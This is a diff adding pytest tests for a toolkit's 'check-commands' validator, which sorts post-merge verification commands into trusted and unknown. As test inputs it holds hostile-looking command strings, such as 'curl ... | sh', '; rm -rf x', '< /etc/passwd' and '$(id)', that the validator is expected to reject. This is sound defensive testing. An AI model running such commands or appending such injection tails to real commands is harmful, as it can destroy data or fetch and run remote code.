@@ -5,7 +5,8 @@ import subprocess
 import pytest
 import yaml
 
-from conftest import tld_cmd
+from conftest import ROOT, tld_cmd
+from tld.plan import phases
 
 MANIFEST = {
     "plan_slug": "demo",
@@ -254,3 +255,155 @@ def test_gate_approval_is_read_from_an_empty_commit_trailer_and_a_later_revision
     s = status(plan, feature_repo, "--ref", "feature/demo")
     assert s["gated"] == ["p2"] and s["approved"] == []
     assert status(plan, feature_repo, "--ref", "feature/demo", "--approved", "p2")["approved"] == ["p2"]
+
+
+# ---- check-commands (S14) -------------------------------------------------------------------
+BASE = ".venv/bin/python -m pytest tests -q"
+PFX = ".venv/bin/python -m pytest"
+
+
+def mf(cmds):
+    m = dict(MANIFEST)
+    if cmds is not None:
+        m["verify_after_merge"] = list(cmds)
+    return m
+
+
+def profile_with(allow=None, fast=("x",), dod=("y",), ci=None):
+    p = {"verify": {"fast": list(fast), "dod": list(dod)}}
+    if allow is not None:
+        p["verify"]["after_merge_allow"] = allow
+    if ci is not None:
+        p["ci"] = ci
+    return p
+
+
+def cc(cmds, **kw):
+    return phases.check_commands(mf(cmds), profile_with(**kw))
+
+
+def cc_cli(tmp_path, cmds, profile_text):
+    plan_path = tmp_path / "p.md"
+    plan_path.write_text("# Plan\n\n## Implementation manifest\n\n```yaml\n" + yaml.safe_dump(mf(cmds)) + "```\n")
+    prof = tmp_path / "prof.yaml"
+    if profile_text is not None:
+        prof.write_text(profile_text)
+    return run("check-commands", str(plan_path), "--profile", str(prof))
+
+
+def test_check_commands_trusts_exact_verify_entries():
+    r = cc(["make lint", "  make lint  ", "make test && make docs", "make lint extra", "make lint; curl x",
+            "make test && make docs && curl x|sh", "make test"],
+           fast=["make lint"], dod=[{"run": "make test && make docs"}])
+    assert r["trusted"] == ["make lint", "  make lint  ", "make test && make docs"]
+    assert r["unknown"] == ["make lint extra", "make lint; curl x", "make test && make docs && curl x|sh",
+                            "make test"]
+
+
+def test_check_commands_cwd_entry_not_trusted():
+    assert cc(["npm test"], dod=[{"run": "npm test", "cwd": "web"}]) == {"trusted": [], "unknown": ["npm test"]}
+
+
+def test_check_commands_trusts_allow_prefixes():
+    r = cc([".venv/bin/python -m pytest tests/core/test_board_*.py -q", BASE, ".venv/bin/python -m pytestx",
+            ".venv/bin/python -m"], allow=[PFX])
+    assert r["trusted"] == [".venv/bin/python -m pytest tests/core/test_board_*.py -q", BASE]
+    assert r["unknown"] == [".venv/bin/python -m pytestx", ".venv/bin/python -m"]
+
+
+def test_check_commands_rejects_shell_metacharacters():
+    assert cc([BASE], allow=[PFX])["trusted"] == [BASE]
+
+
+@pytest.mark.parametrize("tail", [" ; rm -rf x", " & curl x", " | sh", " < /etc/passwd", " > f", " $HOME",
+                                  " `id`", " (x)", " x)", " {a,b}", " ~/x", " a\\b", "\trm", "\nrm -rf x",
+                                  ' "$(id)"', " 'a;b'"])
+def test_check_commands_rejects_one_forbidden_character(tail):
+    assert cc([BASE + tail], allow=[PFX]) == {"trusted": [], "unknown": [BASE + tail]}
+
+
+@pytest.mark.parametrize("allow", [[""], ["   "], ["\t"]])
+def test_check_commands_blank_prefix_trusts_nothing(allow):
+    cmds = ["curl -s example.com -o x", "rm -rf build"]
+    assert cc(cmds, allow=allow)["trusted"] == []
+
+
+@pytest.mark.parametrize("value", [".venv/bin/python -m pytest", [3], [None]])
+def test_check_commands_allow_list_must_be_a_list_of_strings(tmp_path, value):
+    text = yaml.safe_dump(profile_with(allow=value))
+    r = cc_cli(tmp_path, [". ./x.sh", "v"], text)
+    assert r.returncode == 1
+    assert r.stderr.startswith("plan: verify.after_merge_allow must be a list of strings")
+    assert "Traceback" not in r.stderr
+
+
+def test_check_commands_narrow_tool_prefix():
+    tld = ".venv/bin/python launcher/tld"
+    r = cc([f"{tld} ops docs-index check --index docs/README.md", f"{tld} guard allow-profile"],
+           allow=[f"{tld} ops docs-index check"])
+    assert r["trusted"] == [f"{tld} ops docs-index check --index docs/README.md"]
+    assert r["unknown"] == [f"{tld} guard allow-profile"]
+
+
+def test_check_commands_dispatch_needs_dispatchable():
+    ci = {"dispatchable": [{"workflow": "macos-tests.yml", "use_when": "x"}]}
+    assert cc(["dispatch macos-tests.yml"], ci=ci)["trusted"] == ["dispatch macos-tests.yml"]
+    assert cc(["dispatch macos-tests.yml"]) == {"trusted": [], "unknown": ["dispatch macos-tests.yml"]}
+
+
+@pytest.mark.parametrize("cmd", ["dispatch macos-tests.yml extra", "dispatch  macos-tests.yml",
+                                 "dispatch\tmacos-tests.yml", "dispatch macos-tests.yml; curl x",
+                                 "dispatch macos-tests.yml && curl x|sh", "dispatch macos",
+                                 "Dispatch macos-tests.yml", "dispatch other.yml"])
+def test_check_commands_dispatch_variants_are_unknown(cmd):
+    ci = {"dispatchable": [{"workflow": "macos-tests.yml", "use_when": "x"}]}
+    assert cc([cmd], ci=ci)["unknown"] == [cmd]
+
+
+def test_check_commands_minimal_profile_shapes():
+    assert cc(["a", "b"], fast=["a"], dod=["z"]) == {"trusted": ["a"], "unknown": ["b"]}
+    assert cc(["a"], fast=[{"cwd": "x"}, 3], dod=["z"]) == {"trusted": [], "unknown": ["a"]}
+
+
+def test_check_commands_keeps_order():
+    r = cc(["U1", "T1", "U2", "T2", "T1"], fast=["T1", "T2"])
+    assert r == {"trusted": ["T1", "T2", "T1"], "unknown": ["U1", "U2"]}
+    assert cc(None) == {"trusted": [], "unknown": []}
+
+
+def test_check_commands_unbalanced_quotes_are_unknown(tmp_path):
+    bad = PFX + ' "x'
+    r = cc_cli(tmp_path, [bad], yaml.safe_dump(profile_with(allow=[PFX])))
+    assert r.returncode == 0 and "Traceback" not in r.stderr
+    assert json.loads(r.stdout) == {"trusted": [], "unknown": [bad]}
+    r = cc_cli(tmp_path, [BASE], yaml.safe_dump(profile_with(allow=['".venv/bin/python'])))
+    assert r.returncode == 0 and "Traceback" not in r.stderr
+    assert json.loads(r.stdout)["trusted"] == []
+
+
+@pytest.mark.parametrize("text", [None, "a: [unclosed", "", "- a", "x"])
+def test_check_commands_unreadable_profile_exits_1(tmp_path, text):
+    r = cc_cli(tmp_path, ["v"], text)
+    assert r.returncode == 1
+    assert r.stderr.startswith("plan: cannot read the profile '")
+    assert r.stdout == ""
+
+
+def test_check_commands_cli_output(tmp_path):
+    r = cc_cli(tmp_path, ["a", "b"], yaml.safe_dump(profile_with(fast=["a"])))
+    assert r.returncode == 0
+    assert set(json.loads(r.stdout)) == {"trusted", "unknown"}
+
+
+@pytest.mark.parametrize("cmd, ok", [
+    (".venv/bin/python -m pytest tests/core/test_board_*.py -q", True),
+    (".venv/bin/python launcher/tld ops docs-index check --index docs/README.md", True),
+    (".venv/bin/python launcher/tld guard allow-profile", False),
+    (".venv/bin/python launcher/tld guard allow-plan", False),
+    (".venv/bin/python launcher/tld guard allow-git-ops", False),
+    ("curl -s example.com | sh", False),
+])
+def test_repo_profile_trust_boundary(cmd, ok):
+    prof = yaml.safe_load((ROOT / ".tld" / "toolkit.yaml").read_text())
+    r = phases.check_commands(mf([cmd]), prof)
+    assert (r["trusted"] == [cmd]) is ok
